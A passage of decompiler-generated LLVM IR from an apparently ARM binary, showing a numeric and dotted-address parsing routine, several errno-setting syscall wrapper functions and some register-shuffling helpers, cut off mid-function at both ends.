  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i8*
  %v3_fcf4 = load i8, i8* %v2_fcf4, align 1
  %v7_fcf8 = icmp eq i8 %v3_fcf4, 88
  br i1 %v7_fcf8, label %bb80, label %bb

bb:                                               ; preds = %dec_label_pc_fcf4
  %v8_fcfc = icmp eq i8 %v3_fcf4, 120
  br i1 %v8_fcfc, label %bb80, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb80:                                             ; preds = %dec_label_pc_fcf4, %bb
  %v2_fd08 = add i32 %v0_fcf4, 2
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb80
  %v0_fd9822 = phi i32 [ %v1_fcf4, %.thread3 ], [ %v0_fcf4, %.thread ], [ %v2_fd08, %bb80 ]
  %v0_fdac95 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb80 ]
  %v0_fd6448 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb80 ]
  %v1_fd9823 = inttoptr i32 %v0_fd9822 to i8*
  %v2_fd9824 = load i8, i8* %v1_fd9823, align 1
  %v3_fd9825 = zext i8 %v2_fd9824 to i32
  %v2_fda027 = icmp eq i8 %v2_fd9824, 0
  br i1 %v2_fda027, label %dec_label_pc_fdac, label %dec_label_pc_fd1c

dec_label_pc_fd1c:                                ; preds = %.thread9, %dec_label_pc_fd90
  %v0_fdac92 = phi i32 [ 1, %dec_label_pc_fd90 ], [ %v0_fdac95, %.thread9 ]
  %v0_fd90 = phi i32 [ %v1_fd90, %dec_label_pc_fd90 ], [ %v0_fd9822, %.thread9 ]
  %v1_fd80 = phi i32 [ %storemerge, %dec_label_pc_fd90 ], [ 0, %.thread9 ]
  %v1_fd5c = phi i32 [ %v3_fd98, %dec_label_pc_fd90 ], [ %v3_fd9825, %.thread9 ]
  %v2_fd9c28.in = phi i32 [ %v3_fd98, %dec_label_pc_fd90 ], [ %v3_fd9825, %.thread9 ]
  %v0_fd54 = phi i32 [ %v0_fd6450, %dec_label_pc_fd90 ], [ %v0_fd6448, %.thread9 ]
  %v2_fd9c28 = mul nuw nsw i32 %v2_fd9c28.in, 2
  %v4_fd24 = load i32, i32* inttoptr (i32 143884 to i32*), align 4
  %v2_fd28 = add i32 %v4_fd24, %v2_fd9c28
  %v3_fd28 = inttoptr i32 %v2_fd28 to i16*
  %v4_fd28 = load i16, i16* %v3_fd28, align 2
  %v6_fd28 = zext i16 %v4_fd28 to i32
  %v1_fd2c = and i32 %v6_fd28, 8
  %v2_fd2c = icmp eq i32 %v1_fd2c, 0
  br i1 %v2_fd2c, label %dec_label_pc_fd64, label %dec_label_pc_fd38

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fd1c
  %tmp = icmp ult i32 %v1_fd5c, 56
  br i1 %tmp, label %.thread11, label %bb83

.thread11:                                        ; preds = %dec_label_pc_fd38
  br label %dec_label_pc_fd54

bb83:                                             ; preds = %dec_label_pc_fd38
  %v7_fd38 = icmp eq i32 %v0_fd54, 8
  %v2_fd4c = icmp eq i1 %v7_fd38, false
  br i1 %v2_fd4c, label %dec_label_pc_fd54, label %dec_label_pc_fde4

dec_label_pc_fd54:                                ; preds = %.thread11, %bb83
  %v2_fd54 = mul i32 %v0_fd54, %v1_fd80
  %v1_fd58 = add i32 %v2_fd54, -48
  %v2_fd5c = add i32 %v1_fd58, %v1_fd5c
  br label %dec_label_pc_fd88

dec_label_pc_fd64:                                ; preds = %dec_label_pc_fd1c
  %v7_fd64 = icmp eq i32 %v0_fd54, 16
  br i1 %v7_fd64, label %dec_label_pc_fd6c, label %dec_label_pc_fdac

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd64
  %v1_fd6c = and i32 %v6_fd28, 16
  %v2_fd6c = icmp eq i32 %v1_fd6c, 0
  br i1 %v2_fd6c, label %dec_label_pc_fdac, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd6c
  %v1_fd74 = and i32 %v6_fd28, 2
  %tmp100 = mul nuw nsw i32 %v1_fd74, 16
  %tmp101 = or i32 %tmp100, 65
  %v4_fd80 = mul i32 %v1_fd80, 16
  %v5_fd80 = sub i32 %v4_fd80, %tmp101
  %v1_fd84 = add i32 %v5_fd80, 10
  br label %dec_label_pc_fd88

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fd54, %dec_label_pc_fd74
  %v0_fd6450 = phi i32 [ %v0_fd54, %dec_label_pc_fd54 ], [ 16, %dec_label_pc_fd74 ]
  %storemerge = phi i32 [ %v2_fd5c, %dec_label_pc_fd54 ], [ %v1_fd84, %dec_label_pc_fd74 ]
  %tmp102 = icmp ugt i32 %storemerge, 255
  br i1 %tmp102, label %dec_label_pc_fde4, label %dec_label_pc_fd90

dec_label_pc_fd90:                                ; preds = %dec_label_pc_fd88
  %v1_fd90 = add i32 %v0_fd90, 1
  %v1_fd98 = inttoptr i32 %v1_fd90 to i8*
  %v2_fd98 = load i8, i8* %v1_fd98, align 1
  %v3_fd98 = zext i8 %v2_fd98 to i32
  %v2_fda0 = icmp eq i8 %v2_fd98, 0
  br i1 %v2_fda0, label %dec_label_pc_fdac.thread, label %dec_label_pc_fd1c

dec_label_pc_fdac.thread:                         ; preds = %dec_label_pc_fd90
  br label %dec_label_pc_fdb4

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fd6c, %dec_label_pc_fd64, %.thread9
  %v0_fdac = phi i32 [ %v0_fdac95, %.thread9 ], [ %v0_fdac92, %dec_label_pc_fd6c ], [ %v0_fdac92, %dec_label_pc_fd64 ]
  %v0_fdd4 = phi i32 [ %v0_fd9822, %.thread9 ], [ %v0_fd90, %dec_label_pc_fd6c ], [ %v0_fd90, %dec_label_pc_fd64 ]
  %v1_fdc0 = phi i32 [ 0, %.thread9 ], [ %v1_fd80, %dec_label_pc_fd6c ], [ %v1_fd80, %dec_label_pc_fd64 ]
  %v0_fddc = phi i32 [ %v3_fd9825, %.thread9 ], [ %v1_fd5c, %dec_label_pc_fd6c ], [ %v1_fd5c, %dec_label_pc_fd64 ]
  %v2_fdac = icmp eq i32 %v0_fdac, 0
  br i1 %v2_fdac, label %dec_label_pc_fde4, label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fdac.thread, %dec_label_pc_fdac
  %v0_fddc99 = phi i32 [ %v3_fd98, %dec_label_pc_fdac.thread ], [ %v0_fddc, %dec_label_pc_fdac ]
  %v1_fdc098 = phi i32 [ %storemerge, %dec_label_pc_fdac.thread ], [ %v1_fdc0, %dec_label_pc_fdac ]
  %v0_fdd497 = phi i32 [ %v1_fd90, %dec_label_pc_fdac.thread ], [ %v0_fdd4, %dec_label_pc_fdac ]
  %v2_fdb4 = icmp eq i32 %v0_fdc8, 0
  br i1 %v2_fdb4, label %bb87, label %bb86

bb86:                                             ; preds = %dec_label_pc_fdb4
  %v4_fdb8 = mul i32 %v1_fdb8, 256
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_fdb4, %bb86
  %v0_fdc0 = phi i32 [ %v1_fdb8, %dec_label_pc_fdb4 ], [ %v4_fdb8, %bb86 ]
  %v7_fdbc = icmp eq i32 %v0_fddc99, 46
  %v2_fdc0 = or i32 %v0_fdc0, %v1_fdc098
  br i1 %v7_fdbc, label %dec_label_pc_fdc8, label %dec_label_pc_fddc

dec_label_pc_fdc8:                                ; preds = %bb87
  %v1_fdc8 = add i32 %v0_fdc8, 1
  %v7_fdcc = icmp eq i32 %v1_fdc8, 4
  br i1 %v7_fdcc, label %dec_label_pc_fde4, label %dec_label_pc_fdd4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fdc8
  %v1_fdd4 = add i32 %v0_fdd497, 1
  br label %dec_label_pc_fce0

dec_label_pc_fddc:                                ; preds = %bb87
  %v2_fddc = icmp eq i32 %v0_fddc99, 0
  br i1 %v2_fddc, label %dec_label_pc_fde8, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fdc8, %dec_label_pc_fdac, %bb83, %dec_label_pc_fd88, %dec_label_pc_fddc
  br label %dec_label_pc_fde8

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fddc, %dec_label_pc_fde4
  %v0_fde8 = phi i32 [ %v2_fdc0, %dec_label_pc_fddc ], [ -1, %dec_label_pc_fde4 ]
  ret i32 %v0_fde8

; uselistorder directives
  uselistorder i32 %v1_fdc8, { 1, 0 }
  uselistorder i32 %v3_fd98, { 1, 2, 0 }
  uselistorder i32 %v1_fd90, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_fd54, { 1, 2, 0, 3 }
  uselistorder i32 %v1_fd5c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fd80, { 1, 2, 0, 3 }
  uselistorder i32 %v3_fd9825, { 2, 0, 1 }
  uselistorder i32 %v0_fd9822, { 1, 0, 2 }
  uselistorder i32 %v1_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fde8, { 1, 0 }
  uselistorder label %dec_label_pc_fde4, { 4, 0, 1, 3, 2 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %dec_label_pc_fdb4, { 1, 0 }
  uselistorder label %dec_label_pc_fd88, { 1, 0 }
  uselistorder label %dec_label_pc_fd54, { 1, 0 }
  uselistorder label %dec_label_pc_fd1c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb80, { 1, 0 }
}

define i32 @function_fdf8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fdf8:
  %v0_fdf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fdf8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fdf8
  %v1_fdf8 = load i32, i32* @r8, align 4
  %v3_fdf8 = mul i32 %v1_fdf8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fdf8, %bb
  %.01 = phi i32 [ %v3_fdf8, %bb ], [ undef, %dec_label_pc_fdf8 ]
  ret i32 %.01

; uselistorder directives
  uselistorder i32 undef, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_fe00(i32 %arg1) local_unnamed_addr {
dec_label_pc_fe00:
  %stack_var_-12 = alloca i32, align 4
  %v2_fe08 = ptrtoint i32* %stack_var_-12 to i32
  %v0_fe0c = load i32, i32* @r0, align 4
  %v2_fe0c = inttoptr i32 %v0_fe0c to i8*
  %v3_fe0c = call i32 @function_151a8(i8* %v2_fe0c, i32 %v2_fe08)
  %v2_fe10 = icmp eq i32 %v3_fe0c, 0
  %v4_fe14 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_fe10, i32 -1, i32 %v4_fe14
  ret i32 %storemerge
}

define i32 @function_fe28(i32 %arg1) local_unnamed_addr {
dec_label_pc_fe28:
  store i32 2, i32* @r1, align 4
  %v0_fe34 = call i32 @function_fe44()
  ret i32 %v0_fe34
}

define i32 @function_fe44() local_unnamed_addr {
dec_label_pc_fe44:
  %stack_var_-20 = alloca i32, align 4
  %v3_fe44 = load i32, i32* @r4, align 4
  %v6_fe44 = load i32, i32* @r5, align 4
  %v0_fe4c = load i32, i32* @r0, align 4
  store i32 %v0_fe4c, i32* @r4, align 4
  %v0_fe50 = load i32, i32* @r1, align 4
  store i32 %v0_fe50, i32* @r5, align 4
  %v0_fe54 = call i32 @function_1331c()
  %v0_fe7c = load i32, i32* @r4, align 4
  %v2_fe80 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_fe80, i32* @ip, align 4
  %v0_fe84 = load i32, i32* @r5, align 4
  %v8_fe8c = call i32 @function_152a0(i32 %v0_fe7c, i32 %v0_fe84, i32* nonnull @global_var_2583c.414, i32 ptrtoint (i32* @global_var_25684.413 to i32), i32 440, i32 %v2_fe80, i32 %v0_fe54)
  %v3_fe90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_fe44, i32* @r4, align 4
  store i32 %v6_fe44, i32* @r5, align 4
  ret i32 %v3_fe90
}

define i32 @function_fea4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fea4:
  %v0_fea4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fea4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fea4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fea4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_feac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_feac:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_feac = load i32, i32* @r7, align 4
  store i32 %v3_feac, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fed4, label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_feac
  %v0_fec4 = call i32 @function_d0ec()
  %v0_fec8 = load i32, i32* %r7.global-to-local, align 4
  %v1_fec8 = sub i32 0, %v0_fec8
  %v2_fecc = inttoptr i32 %v0_fec4 to i32*
  store i32 %v1_fec8, i32* %v2_fecc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fed8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fed4

dec_label_pc_fed4:                                ; preds = %dec_label_pc_feac, %dec_label_pc_fec4
  %v2_fed8 = phi i32 [ %v3_feac, %dec_label_pc_feac ], [ %v2_fed8.pre, %dec_label_pc_fec4 ]
  %v0_fed4 = phi i32 [ %arg1, %dec_label_pc_feac ], [ -1, %dec_label_pc_fec4 ]
  store i32 %v2_fed8, i32* @r7, align 4
  ret i32 %v0_fed4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fed4, { 1, 0 }
}

define i32 @function_fee4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fee4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fee4 = load i32, i32* @r7, align 4
  store i32 %v3_fee4, i32* %stack_var_-8, align 4
  %v0_fef0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fef0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fef0, -4095
  br i1 %tmp, label %dec_label_pc_ff10, label %dec_label_pc_ff00

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fee4
  %v0_ff00 = call i32 @function_d0ec()
  %v0_ff04 = load i32, i32* %r7.global-to-local, align 4
  %v1_ff04 = sub i32 0, %v0_ff04
  %v2_ff08 = inttoptr i32 %v0_ff00 to i32*
  store i32 %v1_ff04, i32* %v2_ff08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_fee4, %dec_label_pc_ff00
  %v1_ff14 = phi i32 [ %v0_fef0, %dec_label_pc_fee4 ], [ -1, %dec_label_pc_ff00 ]
  %v2_ff10 = phi i32 [ %v3_fee4, %dec_label_pc_fee4 ], [ %v2_ff10.pre, %dec_label_pc_ff00 ]
  store i32 %v2_ff10, i32* @r7, align 4
  ret i32 %v1_ff14

; uselistorder directives
  uselistorder i32 %v0_fef0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff10, { 1, 0 }
}

define i32 @function_ff1c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ff1c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ff1c = load i32, i32* @r7, align 4
  store i32 %v3_ff1c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ff44, label %dec_label_pc_ff34

dec_label_pc_ff34:                                ; preds = %dec_label_pc_ff1c
  %v0_ff34 = call i32 @function_d0ec()
  %v0_ff38 = load i32, i32* %r7.global-to-local, align 4
  %v1_ff38 = sub i32 0, %v0_ff38
  %v2_ff3c = inttoptr i32 %v0_ff34 to i32*
  store i32 %v1_ff38, i32* %v2_ff3c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_ff48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff44

dec_label_pc_ff44:                                ; preds = %dec_label_pc_ff1c, %dec_label_pc_ff34
  %v2_ff48 = phi i32 [ %v3_ff1c, %dec_label_pc_ff1c ], [ %v2_ff48.pre, %dec_label_pc_ff34 ]
  %v0_ff44 = phi i32 [ %arg1, %dec_label_pc_ff1c ], [ -1, %dec_label_pc_ff34 ]
  store i32 %v2_ff48, i32* @r7, align 4
  ret i32 %v0_ff44

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff44, { 1, 0 }
}

define i32 @function_ff54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ff54:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ff54 = load i32, i32* @r7, align 4
  store i32 %v3_ff54, i32* %stack_var_-8, align 4
  %v0_ff60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ff60, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff60, -4095
  br i1 %tmp, label %dec_label_pc_ff80, label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_ff54
  %v0_ff70 = call i32 @function_d0ec()
  %v0_ff74 = load i32, i32* %r7.global-to-local, align 4
  %v1_ff74 = sub i32 0, %v0_ff74
  %v2_ff78 = inttoptr i32 %v0_ff70 to i32*
  store i32 %v1_ff74, i32* %v2_ff78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff54, %dec_label_pc_ff70
  %v1_ff84 = phi i32 [ %v0_ff60, %dec_label_pc_ff54 ], [ -1, %dec_label_pc_ff70 ]
  %v2_ff80 = phi i32 [ %v3_ff54, %dec_label_pc_ff54 ], [ %v2_ff80.pre, %dec_label_pc_ff70 ]
  store i32 %v2_ff80, i32* @r7, align 4
  ret i32 %v1_ff84

; uselistorder directives
  uselistorder i32 %v0_ff60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff80, { 1, 0 }
}

define i32 @function_ff88(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ff88:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ff88 = load i32, i32* @r7, align 4
  store i32 %v3_ff88, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ffb0, label %dec_label_pc_ffa0

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ff88
  %v0_ffa0 = call i32 @function_d0ec()
  %v0_ffa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_ffa4 = sub i32 0, %v0_ffa4
  %v2_ffa8 = inttoptr i32 %v0_ffa0 to i32*
  store i32 %v1_ffa4, i32* %v2_ffa8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_ffb4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ff88, %dec_label_pc_ffa0
  %v2_ffb4 = phi i32 [ %v3_ff88, %dec_label_pc_ff88 ], [ %v2_ffb4.pre, %dec_label_pc_ffa0 ]
  %v0_ffb0 = phi i32 [ %arg1, %dec_label_pc_ff88 ], [ -1, %dec_label_pc_ffa0 ]
  store i32 %v2_ffb4, i32* @r7, align 4
  ret i32 %v0_ffb0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffb0, { 1, 0 }
}

define i32 @function_ffc0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_ffc0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ffc0 = load i32, i32* @r4, align 4
  store i32 %v3_ffc0, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fff0, label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ffc0
  %v0_ffe0 = call i32 @function_d0ec()
  %v0_ffe4 = load i32, i32* %r4.global-to-local, align 4
  %v1_ffe4 = sub i32 0, %v0_ffe4
  %v2_ffe8 = inttoptr i32 %v0_ffe0 to i32*
  store i32 %v1_ffe4, i32* %v2_ffe8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_fff4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fff0

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ffc0, %dec_label_pc_ffe0
  %v2_fff4 = phi i32 [ %v3_ffc0, %dec_label_pc_ffc0 ], [ %v2_fff4.pre, %dec_label_pc_ffe0 ]
  %v0_fff0 = phi i32 [ %arg1, %dec_label_pc_ffc0 ], [ -1, %dec_label_pc_ffe0 ]
  store i32 %v2_fff4, i32* @r4, align 4
  ret i32 %v0_fff0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fff0, { 1, 0 }
}

define i32 @function_10000(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10000:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10034, label %dec_label_pc_10024

dec_label_pc_10024:                               ; preds = %dec_label_pc_10000
  %v0_10024 = call i32 @function_d0ec()
  %v0_10028 = load i32, i32* %r4.global-to-local, align 4
  %v1_10028 = sub i32 0, %v0_10028
  %v2_1002c = inttoptr i32 %v0_10024 to i32*
  store i32 %v1_10028, i32* %v2_1002c, align 4
  br label %dec_label_pc_10034

dec_label_pc_10034:                               ; preds = %dec_label_pc_10000, %dec_label_pc_10024
  %v1_1003c = phi i32 [ %arg1, %dec_label_pc_10000 ], [ -1, %dec_label_pc_10024 ]
  ret i32 %v1_1003c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10034, { 1, 0 }
}

define i32 @function_10044(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10044:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10044 = load i32, i32* @r7, align 4
  store i32 %v3_10044, i32* %stack_var_-8, align 4
  %v0_10050 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10050, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10050, -4095
  br i1 %tmp, label %dec_label_pc_10070, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %dec_label_pc_10044
  %v0_10060 = call i32 @function_d0ec()
  %v0_10064 = load i32, i32* %r7.global-to-local, align 4
  %v1_10064 = sub i32 0, %v0_10064
  %v2_10068 = inttoptr i32 %v0_10060 to i32*
  store i32 %v1_10064, i32* %v2_10068, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10070.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_10044, %dec_label_pc_10060
  %v1_10074 = phi i32 [ %v0_10050, %dec_label_pc_10044 ], [ -1, %dec_label_pc_10060 ]
  %v2_10070 = phi i32 [ %v3_10044, %dec_label_pc_10044 ], [ %v2_10070.pre, %dec_label_pc_10060 ]
  store i32 %v2_10070, i32* @r7, align 4
  ret i32 %v1_10074

; uselistorder directives
  uselistorder i32 %v0_10050, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10070, { 1, 0 }
}

define i32 @function_1007c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1007c:
  store i32 %arg1, i32* @r0, align 4
  %v3_1007c = load i32, i32* @r4, align 4
  %v0_10084 = call i32 @function_cec4()
  %v2_1008c = call i32 @function_cf98(i32 %v0_10084, i32 %arg1)
  store i32 %v3_1007c, i32* @r4, align 4
  ret i32 %v2_1008c

; uselistorder directives
  uselistorder i32 ()* @function_cec4, { 0, 3, 1, 2 }
}

define i32 @function_10098(i32 %arg1) local_unnamed_addr {
dec_label_pc_10098:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_10098 = udiv i32 %arg1, 256
  store i32 %v3_10098, i32* %r1.global-to-local, align 4
  %v2_1009c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1009c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10098
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10098, %bb
  %v0_100a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1009c, i32 %v0_100a8)
  %v0_100ac = load i32, i32* %r1.global-to-local, align 4
  %v1_100ac = add i32 %v0_100ac, 1048320
  %v3_100b0 = udiv i32 %v1_100ac, 65536
  %v1_100b4 = and i32 %v3_100b0, 8
  %v6_100b8 = shl i32 %v0_100ac, %v1_100b4
  %v1_100bc = add i32 %v6_100b8, 520192
  %v3_100c0 = udiv i32 %v1_100bc, 65536
  %v1_100c4 = and i32 %v3_100c0, 4
  %v6_100c8 = shl i32 %v6_100b8, %v1_100c4
  %v1_100cc = add i32 %v6_100c8, 245760
  %v3_100d0 = udiv i32 %v1_100cc, 65536
  %v1_100d4 = and i32 %v3_100d0, 2
  %v6_100d8 = shl i32 %v6_100c8, %v1_100d4
  store i32 %v6_100d8, i32* %r1.global-to-local, align 4
  %v1_100dc = sub nsw i32 13, %v1_100b4
  %v2_100e0 = sub nsw i32 %v1_100dc, %v1_100c4
  %v3_100e4 = udiv i32 %v6_100d8, 32768
  %v4_100e4 = sub nuw nsw i32 -1, %v3_100e4
  %v4_100e8 = udiv i32 %v6_100d8, 16384
  %v5_100e8 = and i32 %v4_100e8, %v4_100e4
  %v2_100ec = sub nsw i32 %v2_100e0, %v1_100d4
  %v2_100f0 = add nsw i32 %v2_100ec, %v5_100e8
  %v1_100f4 = add nsw i32 %v2_100f0, 6
  %v0_100f8 = load i32, i32* %ip.global-to-local, align 4
  %v6_100f8 = lshr i32 %v0_100f8, %v1_100f4
  %v3_100fc = mul nsw i32 %v2_100f0, 4
  %v1_10100 = add nsw i32 %v3_100fc, 32
  %v1_10104 = urem i32 %v6_100f8, 4
  %v2_10108 = or i32 %v1_10104, %v1_10100
  ret i32 %v2_10108

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_10110(i32 %arg1) local_unnamed_addr {
dec_label_pc_10110:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10110 = load i32, i32* @r4, align 4
  %v6_10110 = load i32, i32* @r5, align 4
  %v9_10110 = load i32, i32* @r6, align 4
  %v12_10110 = load i32, i32* @r7, align 4
  %v15_10110 = load i32, i32* @r8, align 4
  %v18_10110 = load i32, i32* @sb, align 4
  %v21_10110 = load i32, i32* @sl, align 4
  %v24_10110 = load i32, i32* @fp, align 4
  %v27_10110 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10124 = load i32, i32* inttoptr (i32 143036 to i32*), align 4
  store i32 %v4_10124, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_10130 = load i32, i32* inttoptr (i32 143000 to i32*), align 8
  store i32 %v4_10130, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_10124, i32* %r2.global-to-local, align 4
  %v2_1013c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1013c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v4_10148 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 %v4_10148, i32* %ip.global-to-local, align 4
